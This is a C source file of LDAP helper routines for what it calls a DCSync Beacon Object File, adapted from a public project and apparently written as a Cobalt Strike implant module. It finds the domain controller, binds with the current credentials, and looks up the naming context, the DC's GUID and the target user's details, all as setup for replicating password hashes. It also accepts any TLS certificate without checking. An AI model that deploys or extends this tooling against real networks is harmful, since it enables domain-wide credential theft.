/*
 * ldap_helpers.c - LDAP utilities for DCSync BOF
 * Adapted from P0142/DCSync-Bof
 */

#include <windows.h>
#include "beacon_compat.h"
#include "ldap_common.h"

// MSVCRT imports
DECLSPEC_IMPORT int __cdecl MSVCRT$strcmp(const char* str1, const char* str2);
DECLSPEC_IMPORT size_t __cdecl MSVCRT$strlen(const char* str);
DECLSPEC_IMPORT char* __cdecl MSVCRT$strcpy(char* dest, const char* src);
DECLSPEC_IMPORT char* __cdecl MSVCRT$strchr(const char *str, int c);
DECLSPEC_IMPORT int __cdecl MSVCRT$_snprintf(char* buffer, size_t count, const char* format, ...);
DECLSPEC_IMPORT void* __cdecl MSVCRT$malloc(size_t size);
DECLSPEC_IMPORT void __cdecl MSVCRT$free(void* ptr);
DECLSPEC_IMPORT void* __cdecl MSVCRT$memcpy(void* dest, const void* src, size_t count);
DECLSPEC_IMPORT void* __cdecl MSVCRT$memset(void* dest, int c, size_t count);

// Kernel32 imports
DECLSPEC_IMPORT int WINAPI KERNEL32$MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);

#define CP_UTF8 65001

// SSL certificate callback - accepts all certificates
BOOLEAN ServerCertCallback(PLDAP Connection, PCCERT_CONTEXT pServerCert) {
    (void)Connection;
    (void)pServerCert;
    return TRUE;
}

// Convert char* to wchar_t*
wchar_t* CharToWChar(const char* str) {
    if (!str) return NULL;

    int len = KERNEL32$MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
    if (len == 0) return NULL;

    wchar_t* wstr = (wchar_t*)MSVCRT$malloc(len * sizeof(wchar_t));
    if (!wstr) return NULL;

    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, str, -1, wstr, len);
    return wstr;
}

// Returns NULL if input is NULL or empty
char* ValidateInput(char* input) {
    if (input == NULL) return NULL;
    if (MSVCRT$strlen(input) == 0) return NULL;
    return input;
}

// Initialize LDAP connection with proper authentication
LDAP* InitializeLDAPConnection(const char* dcAddress, BOOL useLdaps, char** outDcHostname) {
    LDAP* pLdapConnection = NULL;
    ULONG result;
    int portNumber = useLdaps ? LDAP_SSL_PORT : LDAP_PORT;
    char* discoveredDC = NULL;
    char* targetDC = NULL;

    if (!dcAddress || MSVCRT$strlen(dcAddress) == 0) {
        PDOMAIN_CONTROLLER_INFOA pdcInfo = NULL;
        DWORD dwRet = NETAPI32$DsGetDcNameA(NULL, NULL, NULL, NULL, 0, &pdcInfo);

        if (dwRet == 0 && pdcInfo) {
            char* dcName = pdcInfo->DomainControllerName;
            if (dcName && dcName[0] == '\\' && dcName[1] == '\\') {
                dcName += 2;
            }
            if (dcName) {
                size_t len = MSVCRT$strlen(dcName) + 1;
                discoveredDC = (char*)MSVCRT$malloc(len);
                if (discoveredDC) {
                    MSVCRT$strcpy(discoveredDC, dcName);
                }
            }
            NETAPI32$NetApiBufferFree(pdcInfo);
        }

        if (!discoveredDC) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to discover DC");
            return NULL;
        }
        targetDC = discoveredDC;
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Discovered DC: %s", targetDC);
    } else {
        targetDC = (char*)dcAddress;
    }

    if (outDcHostname) {
        size_t len = MSVCRT$strlen(targetDC) + 1;
        *outDcHostname = (char*)MSVCRT$malloc(len);
        if (*outDcHostname) {
            MSVCRT$strcpy(*outDcHostname, targetDC);
        }
    }

    pLdapConnection = WLDAP32$ldap_init(targetDC, portNumber);
    if (!pLdapConnection) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to initialize LDAP connection on port %d", portNumber);
        if (discoveredDC) MSVCRT$free(discoveredDC);
        return NULL;
    }

    ULONG version = LDAP_VERSION3;
    result = WLDAP32$ldap_set_option(pLdapConnection, LDAP_OPT_VERSION, (void*)&version);
    if (result != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to set LDAP version: %lu", result);
        WLDAP32$ldap_unbind_s(pLdapConnection);
        if (discoveredDC) MSVCRT$free(discoveredDC);
        return NULL;
    }

    if (useLdaps) {
        result = WLDAP32$ldap_set_option(pLdapConnection, LDAP_OPT_SSL, LDAP_OPT_ON);
        if (result != LDAP_SUCCESS) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to enable SSL: %lu", result);
            WLDAP32$ldap_unbind_s(pLdapConnection);
            if (discoveredDC) MSVCRT$free(discoveredDC);
            return NULL;
        }
        result = WLDAP32$ldap_set_option(pLdapConnection, LDAP_OPT_SERVER_CERTIFICATE, (void*)&ServerCertCallback);
        if (result != LDAP_SUCCESS) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to set certificate callback: %lu", result);
        }
    } else {
        void* value = LDAP_OPT_ON;
        WLDAP32$ldap_set_option(pLdapConnection, LDAP_OPT_SIGN, &value);
        WLDAP32$ldap_set_option(pLdapConnection, LDAP_OPT_ENCRYPT, &value);
    }

    result = WLDAP32$ldap_bind_s(pLdapConnection, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (result != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to bind to LDAP (0x%x)", result);
        WLDAP32$ldap_unbind_s(pLdapConnection);
        if (discoveredDC) MSVCRT$free(discoveredDC);
        return NULL;
    }

    if (discoveredDC) MSVCRT$free(discoveredDC);
    return pLdapConnection;
}

// Get DC context (defaultNamingContext and DC object GUID)
DC_CONTEXT* GetDCContext(LDAP* ld, const char* dcHostname) {
    if (!ld) return NULL;

    DC_CONTEXT* context = (DC_CONTEXT*)MSVCRT$malloc(sizeof(DC_CONTEXT));
    if (!context) return NULL;
    MSVCRT$memset(context, 0, sizeof(DC_CONTEXT));

    // Build defaultNamingContext from DC hostname (fast path)
    if (dcHostname && MSVCRT$strlen(dcHostname) > 0) {
        const char* domainStart = MSVCRT$strchr(dcHostname, '.');
        if (domainStart && *(domainStart + 1) != '\0') {
            domainStart++;

            int dotCount = 0;
            const char* p = domainStart;
            while (*p) {
                if (*p == '.') dotCount++;
                p++;
            }

            size_t domainLen = MSVCRT$strlen(domainStart);
            size_t bufferSize = domainLen + (dotCount + 1) * 3 + dotCount + 1;

            context->defaultNamingContext = (char*)MSVCRT$malloc(bufferSize);
            if (context->defaultNamingContext) {
                char* writePos = context->defaultNamingContext;
                const char* readPos = domainStart;
                BOOL firstComponent = TRUE;

                while (*readPos) {
                    if (!firstComponent) *writePos++ = ',';
                    firstComponent = FALSE;
                    *writePos++ = 'D';
                    *writePos++ = 'C';
                    *writePos++ = '=';
                    while (*readPos && *readPos != '.') *writePos++ = *readPos++;
                    if (*readPos == '.') readPos++;
                }
                *writePos = '\0';
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Default naming context: %s", context->defaultNamingContext);
            }
        }
    }

    // Query rootDSE for dsServiceName (and defaultNamingContext if not built)
    LDAPMessage* searchResult = NULL;
    LDAPMessage* entry = NULL;
    char* attrs[] = { "defaultNamingContext", "dsServiceName", NULL };

    ULONG result = WLDAP32$ldap_search_s(ld, "", LDAP_SCOPE_BASE, "(objectClass=*)", attrs, 0, &searchResult);
    if (result != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to query rootDSE");
        if (context->defaultNamingContext) MSVCRT$free(context->defaultNamingContext);
        MSVCRT$free(context);
        return NULL;
    }

    entry = WLDAP32$ldap_first_entry(ld, searchResult);
    if (!entry) {
        WLDAP32$ldap_msgfree(searchResult);
        if (context->defaultNamingContext) MSVCRT$free(context->defaultNamingContext);
        MSVCRT$free(context);
        return NULL;
    }

    if (!context->defaultNamingContext) {
        char** ncValues = WLDAP32$ldap_get_values(ld, entry, "defaultNamingContext");
        if (ncValues && ncValues[0]) {
            size_t len = MSVCRT$strlen(ncValues[0]) + 1;
            context->defaultNamingContext = (char*)MSVCRT$malloc(len);
            if (context->defaultNamingContext) {
                MSVCRT$strcpy(context->defaultNamingContext, ncValues[0]);
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Default naming context: %s", context->defaultNamingContext);
            }
            WLDAP32$ldap_value_free(ncValues);
        }
    }

    // Get dsServiceName → query for objectGUID
    char** dsValues = WLDAP32$ldap_get_values(ld, entry, "dsServiceName");
    if (dsValues && dsValues[0]) {
        char* guidAttrs[] = { "objectGUID", NULL };
        LDAPMessage* guidResult = NULL;

        result = WLDAP32$ldap_search_s(ld, dsValues[0], LDAP_SCOPE_BASE, "(objectClass=*)", guidAttrs, 0, &guidResult);
        if (result == LDAP_SUCCESS) {
            LDAPMessage* guidEntry = WLDAP32$ldap_first_entry(ld, guidResult);
            if (guidEntry) {
                struct berval** guidValues = WLDAP32$ldap_get_values_len(ld, guidEntry, "objectGUID");
                if (guidValues && guidValues[0] && guidValues[0]->bv_len == sizeof(GUID)) {
                    MSVCRT$memcpy(&context->dcObjectGuid, guidValues[0]->bv_val, sizeof(GUID));
                    WLDAP32$ldap_value_free_len(guidValues);
                }
            }
            WLDAP32$ldap_msgfree(guidResult);
        }
        WLDAP32$ldap_value_free(dsValues);
    }

    WLDAP32$ldap_msgfree(searchResult);

    if (!context->defaultNamingContext) {
        MSVCRT$free(context);
        return NULL;
    }
    return context;
}

void FreeDCContext(DC_CONTEXT* context) {
    if (!context) return;
    if (context->defaultNamingContext) MSVCRT$free(context->defaultNamingContext);
    MSVCRT$free(context);
}

// Get user info by sAMAccountName or DN
USER_LDAP_INFO* GetUserInfo(LDAP* ld, const char* identifier, const char* searchBase, BOOL isDN) {
    if (!ld || !identifier) return NULL;

    LDAPMessage* searchResult = NULL;
    LDAPMessage* entry = NULL;
    char filter[512];
    char* attrs[] = { "distinguishedName", "sAMAccountName", "objectGUID", NULL };
    USER_LDAP_INFO* userInfo = NULL;

    ULONG result;
    if (isDN) {
        result = WLDAP32$ldap_search_s(ld, (char*)identifier, LDAP_SCOPE_BASE, "(objectClass=*)", attrs, 0, &searchResult);
    } else {
        MSVCRT$_snprintf(filter, sizeof(filter), "(sAMAccountName=%s)", identifier);
        result = WLDAP32$ldap_search_s(ld, (char*)searchBase, LDAP_SCOPE_SUBTREE, filter, attrs, 0, &searchResult);
    }

    if (result != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to query user '%s'", identifier);
        return NULL;
    }

    entry = WLDAP32$ldap_first_entry(ld, searchResult);
    if (!entry) {
        BeaconPrintf(CALLBACK_ERROR, "[-] User '%s' not found", identifier);
        WLDAP32$ldap_msgfree(searchResult);
        return NULL;
    }

    userInfo = (USER_LDAP_INFO*)MSVCRT$malloc(sizeof(USER_LDAP_INFO));
    if (!userInfo) { WLDAP32$ldap_msgfree(searchResult); return NULL; }
    MSVCRT$memset(userInfo, 0, sizeof(USER_LDAP_INFO));

    char** dnValues = WLDAP32$ldap_get_values(ld, entry, "distinguishedName");
    if (dnValues && dnValues[0]) {
        size_t len = MSVCRT$strlen(dnValues[0]) + 1;
        userInfo->distinguishedName = (char*)MSVCRT$malloc(len);
        if (userInfo->distinguishedName) MSVCRT$strcpy(userInfo->distinguishedName, dnValues[0]);
        WLDAP32$ldap_value_free(dnValues);
    }

    char** samValues = WLDAP32$ldap_get_values(ld, entry, "sAMAccountName");
    if (samValues && samValues[0]) {
        size_t len = MSVCRT$strlen(samValues[0]) + 1;
        userInfo->samAccountName = (char*)MSVCRT$malloc(len);
        if (userInfo->samAccountName) MSVCRT$strcpy(userInfo->samAccountName, samValues[0]);
        WLDAP32$ldap_value_free(samValues);
    }

    struct berval** guidValues = WLDAP32$ldap_get_values_len(ld, entry, "objectGUID");
    if (guidValues && guidValues[0] && guidValues[0]->bv_len == sizeof(GUID)) {
        MSVCRT$memcpy(&userInfo->objectGuid, guidValues[0]->bv_val, sizeof(GUID));
        WLDAP32$ldap_value_free_len(guidValues);
    }

    WLDAP32$ldap_msgfree(searchResult);

    if (!userInfo->distinguishedName || !userInfo->samAccountName) {
        if (userInfo->distinguishedName) MSVCRT$free(userInfo->distinguishedName);
        if (userInfo->samAccountName) MSVCRT$free(userInfo->samAccountName);
        MSVCRT$free(userInfo);
        return NULL;
    }
    return userInfo;
}

void FreeUserInfo(USER_LDAP_INFO* userInfo) {
    if (!userInfo) return;
    if (userInfo->distinguishedName) MSVCRT$free(userInfo->distinguishedName);
    if (userInfo->samAccountName) MSVCRT$free(userInfo->samAccountName);
    MSVCRT$free(userInfo);
}

void CleanupLDAP(LDAP* ld) {
    if (ld) WLDAP32$ldap_unbind_s(ld);
}
